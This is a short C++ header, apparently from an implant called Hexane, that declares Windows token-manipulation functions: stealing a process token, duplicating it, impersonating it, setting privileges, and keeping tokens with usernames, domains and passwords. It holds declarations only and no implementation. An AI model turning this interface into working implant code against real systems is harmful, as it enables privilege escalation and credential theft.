#ifndef HEXANE_IMPLANT_SEIMPERSONATE_HPP
#define HEXANE_IMPLANT_SEIMPERSONATE_HPP
#include <core/corelib.hpp>

namespace Token {

    FUNCTION BOOL RevertToken();
    FUNCTION BOOL TokenImpersonate(BOOL Impersonate);
    FUNCTION VOID DuplicateToken(HANDLE orgToken, DWORD Access, SECURITY_IMPERSONATION_LEVEL Level, TOKEN_TYPE Type, PHANDLE newToken);
    FUNCTION VOID SetTokenPrivilege(LPWSTR Privilege, BOOL Enable);
    FUNCTION HANDLE StealProcessToken(HANDLE hTarget, DWORD Pid);
    FUNCTION DWORD AddToken(HANDLE hToken, LPWSTR Username, SHORT Type, DWORD Pid, LPWSTR DomainUser, LPWSTR Domain, LPWSTR Password);
    FUNCTION BOOL RemoveToken(DWORD tokenId);
    FUNCTION PTOKEN_LIST_DATA GetToken(DWORD tokenId);
}
#endif //HEXANE_IMPLANT_SEIMPERSONATE_HPP
